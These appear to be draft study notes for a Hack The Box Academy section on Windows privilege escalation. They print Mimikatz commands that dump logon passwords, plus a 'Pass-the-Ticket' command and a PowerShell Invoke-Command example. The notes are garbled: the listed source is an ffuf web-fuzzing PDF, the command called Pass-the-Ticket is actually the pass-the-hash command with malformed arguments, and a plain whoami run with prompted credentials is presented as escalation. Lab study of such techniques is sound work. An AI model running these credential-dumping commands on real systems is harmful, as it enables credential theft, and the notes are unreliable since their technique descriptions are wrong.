---
title: Hack The Box - Academy Module 54 Section 505
aliases: []
tags:
- topic/hack-the-box-academy
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: 15-54-AttackingWebApplicationsWithFfuf-12-ValueFuzzing.pdf
related_tools:
- '[[mimikatz]]'
- '[[pass-the-ticket]]'
- '[[powershell]]'
related_techniques: []
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Hack The Box - Academy Module 54 Section 505

## Overview
This section covers the use of Mimikatz, Pass-the-Ticket, and PowerShell for privilege escalation on a Windows target. The goal is to gain higher privileges on the system.

## Mimikatz Usage
Mimikatz is a powerful tool for privilege escalation and credential dumping. The following commands are used to extract credentials:

```powershell
mimikatz # Start Mimikatz
privilege::debug # Gain debug privileges
sekurlsa::logonpasswords # Dump logon passwords
```

These commands help in identifying and extracting credentials from the system.

## Pass-the-Ticket
Pass-the-Ticket (PTT) is a technique used to escalate privileges by leveraging existing Kerberos tickets. The following command is used to perform PTT:

```powershell
sekurlsa::pth /user:domain\user /domain /ntlm:ticket /run:cmd.exe # Perform PTT and run a command with elevated privileges
```

This command allows the attacker to execute commands with the privileges of the target user.

## PowerShell for Privilege Escalation
PowerShell can be used to escalate privileges by running commands with elevated permissions. The following command is used to run a command with elevated privileges:

```powershell
Invoke-Command -ComputerName . -ScriptBlock { whoami } -Credential (Get-Credential) # Run a command with elevated privileges
```

This command prompts for credentials and runs the command with the provided credentials.

## References
- https://academy.hackthebox.com/module/54/section/505

